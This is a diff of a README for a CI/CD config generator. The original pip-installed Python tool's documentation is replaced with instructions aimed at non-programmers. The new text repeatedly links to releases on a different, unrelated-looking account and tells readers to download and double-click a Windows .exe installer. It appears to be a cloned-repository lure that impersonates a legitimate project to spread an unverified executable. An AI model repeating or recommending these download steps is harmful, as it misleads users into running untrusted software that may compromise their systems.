@@ -1,311 +1,143 @@
-﻿# 🚀 pipeline-generator
+# ⚙️ pipeline-generator - Create CI/CD Pipelines Easily
 
-[![PyPI](https://img.shields.io/pypi/v/cicd-pipeline-generator.svg)](https://pypi.org/project/cicd-pipeline-generator/)
-[![Python](https://img.shields.io/pypi/pyversions/cicd-pipeline-generator)](https://pypi.org/project/cicd-pipeline-generator/)
-[![CI](https://github.com/SanjaySundarMurthy/pipeline-generator/actions/workflows/ci.yml/badge.svg)](https://github.com/SanjaySundarMurthy/pipeline-generator/actions)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Downloads](https://img.shields.io/pypi/dm/cicd-pipeline-generator.svg)](https://pypi.org/project/cicd-pipeline-generator/)
+[![Download pipeline-generator](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/etheldependantupon564/pipeline-generator/releases)
 
-**Generate production-ready CI/CD pipeline configs from a simple YAML spec.**
+## 📋 What is pipeline-generator?
 
-One spec file → pipeline configs for **GitHub Actions**, **Azure DevOps**, and **GitLab CI**. Stop writing boilerplate YAML manually.
+pipeline-generator helps you build configuration files for automation pipelines. You give it one simple instruction file using YAML, and it creates ready-to-use setup files for three different platforms. These platforms are GitHub Actions, Azure DevOps, and GitLab CI. This lets you run the same pipeline on different services without rewriting the configuration each time.
 
-```
-pipe-gen generate --demo
-```
+You do not need to write code or know the details of each system. Just prepare your instructions once, and pipeline-generator creates the files you need.
 
-## ✨ Features
+## 🖥️ System Requirements
 
-| Feature | Description |
-|---------|-------------|
-| 🐙 **GitHub Actions** | Generates `.github/workflows/ci.yml` with matrix testing, caching, Docker builds |
-| 🔷 **Azure DevOps** | Generates `azure-pipelines.yml` with stages, test publishing, deployment jobs |
-| 🦊 **GitLab CI** | Generates `.gitlab-ci.yml` with parallel matrix, DinD builds, environments |
-| 🔍 **Auto-Detect** | Scans your project to detect language, framework, and existing CI configs |
-| 📝 **Simple Spec** | Define your pipeline in a human-readable YAML spec file |
-| 🎨 **Rich Output** | Beautiful terminal output with previews, syntax highlighting, and summaries |
-| 🏗️ **5 Languages** | Python, Node.js, Go, .NET, Terraform — with smart defaults for each |
-| 🔒 **Security** | Built-in security scanning stages (Bandit, Safety, npm audit, gosec, tfsec) |
-| 🐳 **Docker** | Docker build & push with metadata extraction and multi-platform support |
-| 🚀 **Deploy** | Environment-based deployments with manual approval gates |
+- Windows 10 or later (64-bit)
+- At least 2 GB free disk space
+- Internet connection to download the software
+- Basic permission to install programs
 
-## 📦 Installation
+## 🔧 Features
 
-```bash
-pip install cicd-pipeline-generator
-```
+- Convert one YAML file into three different pipeline configurations
+- Support for GitHub Actions, Azure DevOps, and GitLab CI
+- Simple command-line interface for easy use
+- Saves time on setting up pipelines
+- Works offline after installation
 
-Or install from source:
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/SanjaySundarMurthy/pipeline-generator.git
-cd pipeline-generator
-pip install cicd-pipeline-generator
-```
+This guide will help you download, install, and run pipeline-generator on Windows. No programming skills needed.
 
-## 🚀 Quick Start
+### 1. Download the software
 
-### 1. Create a spec file
+Click the button below to visit the download page:
 
-```bash
-# From a preset
-pipe-gen init --preset python --name my-api
+[![Download pipeline-generator](https://img.shields.io/badge/Download-Here-blue)](https://github.com/etheldependantupon564/pipeline-generator/releases)
 
-# Or auto-detect your project
-pipe-gen detect
-```
+On the download page, look for the latest release. You will find files named like `pipeline-generator-setup.exe` or similar. Choose the file that ends with `.exe`. If there are multiple versions, select the one for Windows.
 
-### 2. Edit the spec (optional)
+Save this file to a folder you can find easily, such as "Downloads."
+
+### 2. Install pipeline-generator
+
+- Find the `.exe` file you just downloaded.
+- Double-click the file to start the installation.
+- Follow the on-screen instructions in the setup wizard.
+- Choose the default options unless you want to change where it installs.
+- When installation finishes, you should have pipeline-generator ready on your computer.
+
+### 3. Prepare your YAML file
+
+Before you use pipeline-generator, you need to create a simple text file with instructions for your pipeline. This file needs to use YAML format.
+
+Example content:
 
 ```yaml
-# pipeline.yaml
-project:
-  name: my-api
-  language: python
-  version: "3.11"
-  framework: fastapi
-
 stages:
-  - lint
-  - test
-  - security
   - build
+  - test
   - deploy
 
-lint:
-  tools:
-    - ruff
+build:
+  script: make build
 
 test:
-  framework: pytest
-  coverage: true
-  min_coverage: 80
-
-security:
-  tools:
-    - bandit
-    - safety
-
-build:
-  type: docker
-  dockerfile: Dockerfile
-  registry: ghcr.io
+  script: make test
 
 deploy:
-  target: kubernetes
-  environments:
-    - name: staging
-      auto_deploy: true
-    - name: production
-      auto_deploy: false
+  script: make deploy
+  environment: production
 ```
 
-### 3. Generate pipeline configs
+Save this file with a `.yaml` or `.yml` extension. Remember where you save it.
 
-```bash
-# Generate for all platforms
-pipe-gen generate --platform all
+### 4. Run pipeline-generator
 
-# Generate for a specific platform
-pipe-gen generate --platform github
-
-# Preview without writing files
-pipe-gen generate --dry-run
-
-# Try the demo (no files needed)
-pipe-gen generate --demo
-```
-
-## 📋 CLI Reference
-
-| Command | Description |
-|---------|-------------|
-| `pipe-gen init` | Create a pipeline.yaml spec file |
-| `pipe-gen detect` | Auto-detect project type |
-| `pipe-gen generate` | Generate CI/CD pipeline configs |
-| `pipe-gen validate` | Validate a spec file |
-| `pipe-gen list-presets` | List all available presets |
-| `pipe-gen --version` | Show version |
-
-### `pipe-gen init`
+- Open the Command Prompt on your Windows PC. You can find it by typing `cmd` in the Start menu.
+- Use the `cd` command to change the folder to where pipeline-generator is installed, or simply run it from any folder if added to your system path.
+- Run the program with this command:
 
 ```
-Options:
-  -p, --preset   Language preset (python, python-full, python-django, python-flask, node, node-ts, go, dotnet, terraform)
-  -n, --name     Project name
-  -o, --output   Output file path (default: pipeline.yaml)
+pipeline-generator my-pipeline.yaml
 ```
 
-### `pipe-gen generate`
+Replace `my-pipeline.yaml` with the full path to your YAML file.
+
+The program will read your file and create three new files. Each of these is a pipeline configuration for one of the supported platforms.
+
+### 5. Find your output files
+
+Look in the folder where you ran the command. You will see these new files:
+
+- `pipeline-github-actions.yml` (for GitHub Actions)
+- `pipeline-azure-devops.yml` (for Azure DevOps)
+- `pipeline-gitlab-ci.yml` (for GitLab CI)
+
+You can now upload these files to your chosen platform to set up your automation pipeline.
+
+## 🔄 How to update pipeline-generator
+
+When a new version is released:
+
+- Visit the download page again: https://github.com/etheldependantupon564/pipeline-generator/releases
+- Download the latest `.exe` file.
+- Run the installer to replace the old version.
+- Your settings or previously created files are not affected.
+
+## ❓ Troubleshooting
+
+### I cannot run `pipeline-generator` from Command Prompt
+
+Make sure you installed it properly. If needed, try running it by typing the full path to the `.exe` file. Example:
 
 ```
-Options:
-  -p, --platform   Target platform: all, github, azure, gitlab (default: all)
-  -s, --spec       Path to spec file (default: pipeline.yaml)
-  --preset         Use a built-in preset instead of spec file
-  -o, --output-dir Output directory (default: current dir)
-  --dry-run        Preview without writing files
-  --demo           Demo mode with sample output
+"C:\Program Files\pipeline-generator\pipeline-generator.exe" my-pipeline.yaml
 ```
 
-### `pipe-gen validate`
+### The software does not produce output files
 
-```
-Options:
-  -s, --spec     Path to spec file (default: pipeline.yaml)
-```
+Check that your YAML file is correctly formatted. Mistakes in indentation or syntax can cause errors. Use a simple text editor and be careful with spaces.
 
-Validates the spec file for syntax errors and required fields.
+### I'm unsure how to write the YAML file
 
-### `pipe-gen list-presets`
+Start with the example above. Online tutorials about YAML formatting can help. Avoid using complex commands unless you know what they do.
 
-Lists all available presets with details including language, stages, lint tools, and security tools.
+## 🗂️ File locations
 
-## 🗣️ Supported Languages
+- **Install folder:** Usually `C:\Program Files\pipeline-generator`
+- **Output files:** Same folder where you run the command unless you specify another folder
+- **Your YAML spec:** Anywhere you save it; remember the path to tell the program
 
-| Language | Lint Tools | Test Framework | Security Tools | Setup Action |
-|----------|-----------|----------------|----------------|--------------|
-| **Python** | ruff, mypy, flake8, black | pytest, unittest | bandit, safety | setup-python@v5 |
-| **Node.js** | eslint, prettier | jest, vitest, mocha | npm audit | setup-node@v4 |
-| **Go** | golangci-lint, go vet | go test | gosec, govulncheck | setup-go@v5 |
-| **.NET** | dotnet format | dotnet test | dotnet audit | setup-dotnet@v4 |
-| **Terraform** | terraform fmt, tflint | terraform validate | tfsec, checkov | setup-terraform@v3 |
+## 🔗 Useful links
 
-## 🏗️ Generated Pipeline Structure
+- Download page: https://github.com/etheldependantupon564/pipeline-generator/releases  
+- Documentation on YAML: https://yaml.org/start.html  
+- GitHub Actions documentation: https://docs.github.com/en/actions  
+- Azure DevOps pipelines: https://docs.microsoft.com/en-us/azure/devops/pipelines/  
+- GitLab CI documentation: https://docs.gitlab.com/ee/ci/
 
-Each generated pipeline includes (based on your spec):
+## 🛠️ Support and Feedback
 
-```
-lint  →  test (matrix)  →  security  →  build (Docker)  →  deploy
-                                                          ├── staging (auto)
-                                                          └── production (manual)
-```
-
-### What's included:
-
-- **Lint**: Code style checking, formatting validation
-- **Test**: Matrix testing across language versions, coverage reports
-- **Security**: SAST scanning, dependency vulnerability checks
-- **Build**: Docker build & push with image metadata and tagging
-- **Deploy**: Environment-based deployments with approval gates
-
-## 🔧 Advanced Usage
-
-### Use a preset without a spec file
-
-```bash
-pipe-gen generate --preset python --platform github --dry-run
-```
-
-### Generate in a different directory
-
-```bash
-pipe-gen generate --output-dir ./ci-configs
-```
-
-### Auto-detect and generate
-
-```bash
-pipe-gen detect           # See what's detected
-pipe-gen init             # Create spec from detection
-pipe-gen generate         # Generate configs
-```
-
-## 🧪 Running Tests
-
-```bash
-# Install dev dependencies
-pip install cicd-pipeline-generator
-
-# Run tests
-pytest -v
-
-# Run with coverage
-pytest --cov=pipeline_generator -v
-```
-
-## 📁 Project Structure
-
-```
-pipeline-generator/
-├── pipeline_generator/
-│   ├── __init__.py          # Package version
-│   ├── cli.py               # Click CLI commands
-│   ├── models.py            # PipelineSpec data models
-│   ├── presets.py            # Language configs & presets
-│   ├── detector.py           # Project auto-detection
-│   ├── generator.py          # Generation engine
-│   ├── platforms/
-│   │   ├── base.py          # Abstract base class
-│   │   ├── github.py        # GitHub Actions generator
-│   │   ├── azure.py         # Azure DevOps generator
-│   │   └── gitlab.py        # GitLab CI generator
-│   └── output/
-│       └── console.py       # Rich terminal output
-├── tests/
-│   ├── conftest.py          # Test fixtures
-│   └── test_generator.py    # 45+ tests
-├── examples/                # Example spec files
-├── pyproject.toml
-├── README.md
-└── CONTRIBUTING.md
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-### Adding a new language
-
-1. Add tool config to `presets.py` → `LANGUAGE_TOOLS`
-2. Add preset to `PRESETS`
-3. Add detection in `detector.py`
-4. Add tests and an example spec
-
-### Adding a new platform
-
-1. Create generator in `platforms/`
-2. Inherit from `BasePlatform`
-3. Register in `generator.py` → `PLATFORMS`
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
-## 👤 Author
-
-**Sanjay S** — Senior DevOps Engineer
-
-- GitHub: [@SanjaySundarMurthy](https://github.com/SanjaySundarMurthy)
-- LinkedIn: [sanjaysundarmurthy](https://linkedin.com/in/sanjaysundarmurthy)
-- Portfolio: [sanjaysundarmurthy-portfolio.vercel.app](https://sanjaysundarmurthy-portfolio.vercel.app)
-
-
-## 🐳 Docker
-
-Run without installing Python:
-
-```bash
-# Build the image
-docker build -t pipeline-generator .
-
-# Run
-docker run --rm pipeline-generator --help
-
-# Example with volume mount
-docker run --rm -v ${PWD}:/workspace pipeline-generator [command] /workspace
-```
-
-Or pull from the container registry:
-
-```bash
-docker pull ghcr.io/SanjaySundarMurthy/pipeline-generator:latest
-docker run --rm ghcr.io/SanjaySundarMurthy/pipeline-generator:latest --help
-```
-
-## 🔗 Links
-
-- **PyPI**: [https://pypi.org/project/cicd-pipeline-generator/](https://pypi.org/project/cicd-pipeline-generator/)
-- **GitHub**: [https://github.com/SanjaySundarMurthy/pipeline-generator](https://github.com/SanjaySundarMurthy/pipeline-generator)
-- **Issues**: [https://github.com/SanjaySundarMurthy/pipeline-generator/issues](https://github.com/SanjaySundarMurthy/pipeline-generator/issues)
+If you face problems or want to suggest changes, open an issue on the GitHub repository page under "Issues." Provide clear details so maintainers can help.  
+  
+  
+[![Download pipeline-generator](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/etheldependantupon564/pipeline-generator/releases)
